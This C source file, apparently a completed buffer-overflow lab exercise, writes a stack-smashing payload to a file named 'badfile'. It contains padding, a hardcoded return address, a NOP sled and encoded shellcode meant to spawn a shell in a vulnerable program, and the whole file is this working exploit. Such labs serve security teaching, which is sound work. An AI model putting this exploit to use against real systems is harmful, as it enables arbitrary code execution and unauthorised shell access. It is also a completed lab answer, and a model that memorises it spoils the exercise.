/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]= "\xbb\x48\xf5\x5c\x2d\xd9\xea\xd9\x74\x24\xf4\x5d\x31\xc9"
"\xb1\x12\x31\x5d\x12\x83\xed\xfc\x03\x15\xfb\xbe\xd8\x94"
"\xd8\xc8\xc0\x85\x9d\x65\x6d\x2b\xab\x6b\xc1\x4d\x66\xeb"
"\xb1\xc8\xc8\xd3\x78\x6a\x61\x55\x7a\x02\x78\xa5\x7e\xdd"
"\x14\xa7\x7e\xf0\xb8\x2e\x9f\x42\x26\x61\x31\xf1\x14\x82"
"\x38\x14\x97\x05\x68\xbe\x46\x29\xfe\x56\xff\x1a\x2f\xc4"
"\x96\xed\xcc\x5a\x3a\x67\xf3\xea\xb7\xba\x74";

void main(int argc, char **argv)
{
    char buffer[550];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 550);

    /* You need to fill the buffer with appropriate contents here */ 
    memset(&buffer, 0x41, 44);
//  \x83\xea\xff\xbf - the correct return address
//  write the return address in to the buffer
    char *ret_add = "\x83\xea\xff\xbf";
    memcpy(buffer+44, ret_add, sizeof(ret_add));
    memcpy(buffer+200, shellcode, sizeof(shellcode));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 550, 1, badfile);
    fclose(badfile);
}

